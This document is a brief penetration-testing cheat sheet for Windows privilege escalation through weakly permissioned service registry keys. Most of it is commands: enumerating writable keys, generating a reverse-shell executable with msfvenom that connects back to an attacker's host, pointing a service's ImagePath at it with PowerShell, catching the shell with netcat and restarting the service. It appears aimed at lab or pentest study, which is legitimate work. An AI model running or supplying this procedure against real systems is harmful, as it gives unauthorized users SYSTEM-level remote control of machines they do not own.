## Registry Path Exploitation

### Steps

#### Recon / Enumeration

We are looking for registry keys that state, that all users have permission to edit this key of a service.

It can be recognized with this syntax:

```
Permissions: AllAccess
```

or 

```
Access: Everyone Allow ReadKey
```

#### Exploitation

**Upload shell exe binary**
Make an reverse shell executable:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> lport=<port> -a x64 --platform windows -f exe -o exploit.exe
```

Upload an exe binary made with msfvenom to a folder you have permission to like:

```
C:\Temp
C:\Program Data\
C:\Users\<username>\Downloads,Desktop,etc
```

Insert it into the service/registry key with this command in powershell as a lowpriv user:

```
Set-ItemProperty -Path "Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE<\SystemKeyStatedPath>" -Name "ImagePath" -Value "C:<Path\To\Rev\Shell.exe>"
```

**Attacker machine side**

```
nc -lvnp <port>
```

**Back at victim shell**
restart/stop -> start the service that is connected to the registry key.

```
Restart-Service -Name "<servicename>"
```

